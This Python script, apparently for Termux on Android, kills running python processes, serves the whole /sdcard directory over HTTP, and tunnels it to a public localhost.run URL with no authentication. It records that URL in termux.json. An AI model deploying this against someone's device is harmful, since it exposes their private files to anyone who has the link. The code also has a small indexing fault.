import subprocess,requests,time
import pexpect
import re
import select
import json


def id():
    with open('termux.json', 'r') as file:
        dataj = json.load(file)
        id = dataj['id']
        uid = dataj['uid']
    if id == None:
        id = 1
        uid = None
    return {"id": id,"uid": uid}

# Function to expose the local server
def server():
    command0 = "ps -ef | grep python"
    #close exist terminal
    result = subprocess.run(command0, shell=True,stdout=subprocess.PIPE, text=True)

    # Split the output into lines and process each line
    lines = result.stdout.split('\n')
    processes = []
    for line in lines:
        parts = line.split()
        #print(parts)
        if len(parts) >= 8 and "-m" in parts[8]:
            process_info = {
                "user": parts[8],
                "pid": int(parts[1])
                }
            #print(process_info)
            command1 = f"kill -9 {process_info['pid']}"
            subprocess.run(command1, shell=True, stdout=subprocess.PIPE, text=True)
            
    local_port = 8000  # Your local server port
    command = f'ssh -R 80:localhost:{local_port} ssh.localhost.run'
    conn = 'python -m http.server -d /sdcard'
    process1 = subprocess.Popen(conn, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, close_fds=True)

    try:
        # Run the SSH command in a subprocess
        process = pexpect.spawn(command)

        # Expect SSH passphrase prompt and provide passphrase
        #process.expect('Enter passphrase for key')
        #process.sendline('seam')

        first_url_printed = False  # Flag to track if the
        
        while True:
            
            # Check if the process is still running
            if process.isalive():
                # Use select to check if there's output ready to be read
                if select.select([process], [], [], 0)[0]:
                    output = process.readline().decode('utf-8').strip()
                    if output:
                        # Use a regular expression to find the URL
                        match = re.search(r"https://\w+\.lhr\.life\b", output)
                        if match and not first_url_printed:
                            with open('termux.json', 'r') as file:
                                datak = json.load(file)
                                # Update "id" and "uid" values
                            datak['sto'] = True
                            datak['com'] = str(match.group())
                            print(datak['com'])
                            with open('termux.json', 'w') as file:
                                json.dump(datak, file, indent=4)
                            first_url_printed = True
                            while True:
                                sso = requests.get(datak['com'])
                                #print(sso)
                #else:
                #server()
                # Print if no URL was found

    except Exception as e:
        print(f'An error occurred: {str(e)}')
        pass
    
if __name__ == '__main__':
    server()
